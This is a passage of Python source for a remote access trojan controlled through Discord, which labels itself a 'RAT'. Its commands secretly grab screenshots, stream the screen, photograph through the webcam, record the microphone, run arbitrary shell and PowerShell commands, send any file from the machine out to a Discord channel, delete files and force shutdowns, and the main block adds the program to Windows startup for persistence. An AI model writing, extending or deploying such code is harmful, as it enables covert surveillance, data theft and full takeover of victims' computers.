        subprocess.run(f'powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Process -Id $pid).Path); $notify.BalloonTipText = \'{message}\'; $notify.BalloonTipTitle = \'System Alert\'; $notify.Visible = $true; $notify.ShowBalloonTip(5000)"', shell=True)
        await send_embed(ctx, "Notification Sent", f"**{message}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Notify Error", str(e), discord.Color.red())

@bot.command(name='alarm')
@is_authorized()
async def cmd_alarm(ctx, duration: int = 5):
    try:
        await send_embed(ctx, "🔔 Alarm", f"Ringing for {duration} seconds", discord.Color.orange())
        for i in range(duration):
            ctypes.windll.kernel32.Beep(1000, 500)
            await asyncio.sleep(1)
        await send_embed(ctx, "Alarm Done", "Alarm finished!", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Alarm Error", str(e), discord.Color.red())

@bot.command(name='rickroll')
@is_authorized()
async def cmd_rickroll(ctx):
    try:
        browser_name, browser_path = get_default_browser()
        
        rickrolls = [
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=43s',
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s',
        ]
        url = random.choice(rickrolls)
        
        if browser_name == 'unknown':
            webbrowser.open(url)
            await send_embed(ctx, "🎵 Rickroll Activated", f"Opened in default browser: {url}", discord.Color.gold())
        else:
            subprocess.Popen([browser_path, url])
            await send_embed(ctx, "🎵 Rickroll Activated", f"Opened in **{browser_name.title()}**!", discord.Color.gold())
            
        try:
            engine = pyttsx3.init()
            engine.say("Never gonna give you up, never gonna let you down!")
            engine.runAndWait()
        except:
            pass
            
    except Exception as e:
        await send_embed(ctx, "Error", f"Failed to open rickroll: {str(e)}", discord.Color.red())

# ========== CONTROL COMMANDS ==========

@bot.command(name='screenshot')
@is_authorized()
async def cmd_screenshot(ctx, name: Optional[str] = None):
    try:
        filename = name if name else f"screenshot_{int(time.time())}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        
        with open(filename, 'rb') as f:
            picture = discord.File(f)
        
        await send_embed(ctx, "📸 Screenshot", f"Captured: **{filename}**", discord.Color.green())
        await ctx.send(file=picture)
        os.remove(filename)
    except Exception as e:
        await send_embed(ctx, "Screenshot Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='screenshare')
@is_authorized()
async def cmd_screenshare(ctx):
    global STREAMING, STREAM_TASK
    
    if STREAMING:
        await send_embed(ctx, "Already Streaming", "Screen sharing is already active!", discord.Color.orange())
        return
    
    STREAMING = True
    await send_embed(ctx, "📺 Screen Share Started", "Sending screenshots every 2 seconds. Use `stopscreenshare` to stop.", discord.Color.green())
    
    async def stream_screen():
        while STREAMING:
            try:
                screenshot = pyautogui.screenshot()
                filename = f"stream_{int(time.time())}.png"
                screenshot.save(filename)
                await ctx.send(file=discord.File(filename))
                os.remove(filename)
                await asyncio.sleep(2)
            except:
                break
    
    STREAM_TASK = asyncio.create_task(stream_screen())

@bot.command(name='stopscreenshare')
@is_authorized()
async def cmd_stopscreenshare(ctx):
    global STREAMING, STREAM_TASK
    
    if not STREAMING:
        await send_embed(ctx, "Not Streaming", "No active screen share to stop.", discord.Color.orange())
        return
    
    STREAMING = False
    if STREAM_TASK:
        STREAM_TASK.cancel()
    await send_embed(ctx, "⏹️ Screen Share Stopped", "Screen sharing has been stopped.", discord.Color.red())

@bot.command(name='webcam')
@is_authorized()
async def cmd_webcam(ctx):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            await ctx.send(file=discord.File("webcam.jpg"))
            os.remove("webcam.jpg")
            await send_embed(ctx, "📸 Webcam Photo", "Webcam photo captured!", discord.Color.green())
        else:
            await send_embed(ctx, "Webcam Error", "Could not access webcam", discord.Color.red())
        cap.release()
    except Exception as e:
        await send_embed(ctx, "Webcam Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='micrecord')
@is_authorized()
async def cmd_micrecord(ctx, duration: int = 5):
    try:
        import pyaudio
        import wave
        
        await send_embed(ctx, "🎤 Recording", f"Recording for {duration} seconds...", discord.Color.blue())
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = duration
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        filename = f"recording_{int(time.time())}.wav"
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
        await send_embed(ctx, "✅ Recording Complete", f"Recorded {duration} seconds", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Mic Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='open')
@is_authorized()
async def cmd_open(ctx, *, app_name: str):
    try:
        app_map = {
            'notepad': 'notepad.exe',
            'calculator': 'calc.exe',
            'chrome': 'chrome.exe',
            'firefox': 'firefox.exe',
            'explorer': 'explorer.exe',
            'cmd': 'cmd.exe',
            'vscode': 'code.exe',
            'discord': 'discord.exe',
            'spotify': 'spotify.exe',
            'steam': 'steam.exe',
        }

        app_to_open = app_map.get(app_name.lower(), app_name)
        subprocess.Popen(app_to_open, shell=True)
        await send_embed(ctx, "✅ Opened", f"**{app_name}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Open Error", f"Failed to open application: {str(e)}", discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def cmd_close(ctx, *, app_name: str):
    try:
        closed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                closed = True

        if closed:
            await send_embed(ctx, "✅ Closed", f"**{app_name}**", discord.Color.green())
        else:
            await send_embed(ctx, "Close Failed", f"No process found: **{app_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Close Error", f"Failed to close application: {str(e)}", discord.Color.red())

@bot.command(name='listapps')
@is_authorized()
async def cmd_listapps(ctx, limit: int = 15):
    try:
        windows = gw.getAllTitles()
        active_windows = [win for win in windows if win]

        embed = discord.Embed(
            title="📋 Running Applications",
            description=f"Showing **{min(limit, len(active_windows))}** of **{len(active_windows)}** total windows",
            color=discord.Color.green()
        )

        for i, window in enumerate(active_windows[:limit]):
            embed.add_field(name=f"#{i+1} - {window[:50]}", value="\u200b", inline=False)

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Apps Error", f"Failed to list applications: {str(e)}", discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def cmd_cmd(ctx, *, command: str):
    try:
        await send_embed(ctx, "Command Executing", f"Running command: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        embed = discord.Embed(
            title="💻 Command Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await send_embed(ctx, "Command Error", "Command timed out!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

@bot.command(name='powershell')
@is_authorized()
async def cmd_powershell(ctx, *, command: str):
    try:
        await send_embed(ctx, "PowerShell Executing", f"Running: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        embed = discord.Embed(
            title="⚡ PowerShell Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await send_embed(ctx, "PowerShell Error", "Command timed out!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "PowerShell Error", f"Failed: {str(e)}", discord.Color.red())

# ========== MOUSE & KEYBOARD COMMANDS ==========

@bot.command(name='click')
@is_authorized()
async def cmd_click(ctx, button: str = 'left'):
    try:
        button = button.lower()
        if button == 'left':
            pyautogui.click()
            await send_embed(ctx, "Mouse Click", "Performed **left** click", discord.Color.blue())
        elif button == 'right':
            pyautogui.rightClick()
            await send_embed(ctx, "Mouse Click", "Performed **right** click", discord.Color.blue())
        elif button == 'middle':
            pyautogui.middleClick()
            await send_embed(ctx, "Mouse Click", "Performed **middle** click", discord.Color.blue())
        else:
            await send_embed(ctx, "Invalid Button", "Use: **left**, **right**, or **middle**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Click Error", f"Failed to click: {str(e)}", discord.Color.red())

@bot.command(name='press')
@is_authorized()
async def cmd_press(ctx, *, key_combo: str):
    try:
        pyautogui.hotkey(*key_combo.split('+'))
        await send_embed(ctx, "Keys Pressed", f"Pressed: **{key_combo}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Press Error", f"Failed to press keys: {str(e)}", discord.Color.red())

@bot.command(name='type')
@is_authorized()
async def cmd_type(ctx, *, text: str):
    try:
        pyautogui.typewrite(text)
        await send_embed(ctx, "Typing", f"Typed: **{text[:50]}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Type Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='move')
@is_authorized()
async def cmd_move(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await send_embed(ctx, "Mouse Moved", f"Moved to ({x}, {y})", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Move Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='scroll')
@is_authorized()
async def cmd_scroll(ctx, amount: int):
    try:
        pyautogui.scroll(amount)
        await send_embed(ctx, "Scrolled", f"Scrolled **{amount}** clicks", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Scroll Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='doubleclick')
@is_authorized()
async def cmd_doubleclick(ctx):
    try:
        pyautogui.doubleClick()
        await send_embed(ctx, "Double Click", "Performed double click", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Click Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='rightclick')
@is_authorized()
async def cmd_rightclick(ctx):
    try:
        pyautogui.rightClick()
        await send_embed(ctx, "Right Click", "Performed right click", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Click Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='getpos')
@is_authorized()
async def cmd_getpos(ctx):
    try:
        pos = pyautogui.position()
        await send_embed(ctx, "Mouse Position", f"**({pos.x}, {pos.y})**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Position Error", f"Failed: {str(e)}", discord.Color.red())

# ========== POWER CONTROL COMMANDS ==========

@bot.command(name='shutdown')
@is_authorized()
async def cmd_shutdown(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds**", discord.Color.orange())
            return

        await send_embed(ctx, "💻 Shutdown", f"Shutting down in **{delay}** seconds", discord.Color.red())

        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Shutting down in **5 seconds**...", discord.Color.dark_red())
        await asyncio.sleep(5)

        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Shutdown Error", f"Failed to shutdown: {str(e)}", discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def cmd_restart(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds**", discord.Color.orange())
            return

        await send_embed(ctx, "🔄 Restart", f"Restarting in **{delay}** seconds", discord.Color.orange())

        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Restarting in **5 seconds**...", discord.Color.dark_orange())
        await asyncio.sleep(5)

        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Restart Error", f"Failed to restart: {str(e)}", discord.Color.red())

@bot.command(name='sleep')
@is_authorized()
async def cmd_sleep(ctx):
    try:
        ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
        await send_embed(ctx, "💤 Sleep", "Computer is going to sleep!", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Sleep Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='logoff')
@is_authorized()
async def cmd_logoff(ctx):
    try:
        os.system('shutdown /l')
        await send_embed(ctx, "👋 Logoff", "Logging off user!", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Logoff Error", f"Failed: {str(e)}", discord.Color.red())

# ========== MEDIA COMMANDS ==========

@bot.command(name='playpause')
@is_authorized()
async def cmd_playpause(ctx):
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "⏯️ Media", "Toggled play/pause", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def cmd_nexttrack(ctx):
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "⏭️ Media", "Next track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='prevtrack')
@is_authorized()
async def cmd_prevtrack(ctx):
    try:
        pyautogui.press('prevtrack')
        await send_embed(ctx, "⏮️ Media", "Previous track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())

@bot.command(name='volumeup')
@is_authorized()
async def cmd_volumeup(ctx):
    try:
        pyautogui.press('volumeup')
        await send_embed(ctx, "🔊 Media", "Volume up", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='volumedown')
@is_authorized()
async def cmd_volumedown(ctx):
    try:
        pyautogui.press('volumedown')
        await send_embed(ctx, "🔉 Media", "Volume down", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='mute')
@is_authorized()
async def cmd_mute(ctx):
    try:
        pyautogui.press('volumemute')
        await send_embed(ctx, "🔇 Media", "Volume muted", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())

# ========== FILES COMMANDS ==========

@bot.command(name='listfiles')
@is_authorized()
async def cmd_listfiles(ctx, directory: str = "."):
    try:
        files = os.listdir(directory)

        embed = discord.Embed(
            title=f"📁 Files in {directory}",
            color=discord.Color.blue()
        )

        file_list = []
        for file in files[:20]:  
            file_path = os.path.join(directory, file)
            if os.path.isdir(file_path):
                file_list.append(f"**{file}/**")
            else:
                file_list.append(f"**{file}**")

        embed.description = "\n".join(file_list)
        if len(files) > 20:
            embed.set_footer(text=f"And {len(files) - 20} more files...")

        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Files Error", f"Failed to list files: {str(e)}", discord.Color.red())

@bot.command(name='download')
@is_authorized()
async def cmd_download(ctx, *, filepath: str):
    try:
        if not os.path.exists(filepath):
            await send_embed(ctx, "Download Error", "File not found!", discord.Color.red())
            return
        
        await ctx.send(file=discord.File(filepath))
        await send_embed(ctx, "Download Complete", f"Sent: **{filepath}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Download Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='deletefile')
@is_authorized()
async def cmd_deletefile(ctx, *, filepath: str):
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            await send_embed(ctx, "File Deleted", f"Deleted: **{filepath}**", discord.Color.red())
        else:
            await send_embed(ctx, "File Not Found", f"File not found: **{filepath}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Delete Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='createfile')
@is_authorized()
async def cmd_createfile(ctx, filename: str, *, content: str = ""):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        await send_embed(ctx, "File Created", f"Created: **{filename}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Create Error", f"Failed: {str(e)}", discord.Color.red())

# ========== BOT COMMANDS ==========

@bot.command(name='clearchat')
@is_authorized()
async def cmd_clearchat(ctx, amount: int = 100):
    try:
        deleted = 0
        async for message in ctx.channel.history(limit=amount):
            if message.author == bot.user:
                await message.delete()
                deleted += 1
                await asyncio.sleep(0.1)
        
        if deleted > 0:
            msg = await ctx.send(f"✅ Deleted **{deleted}** bot messages!")
            await asyncio.sleep(2)
            await msg.delete()
        else:
            await ctx.send("No bot messages found to delete.", delete_after=3)
    except Exception as e:
        await send_embed(ctx, "Clear Error", f"Failed: {str(e)}", discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def cmd_exit(ctx):
    try:
        embed = discord.Embed(
            title="👋 Goodbye!",
            description="RAT is closing...",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
        time.sleep(1)
        sys.exit(0)
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

# ========== RUN ==========
if __name__ == "__main__":
    if platform.system() == "Windows" and Config.STARTUP:
        add_to_startup()
    bot.run(Config.TOKEN)
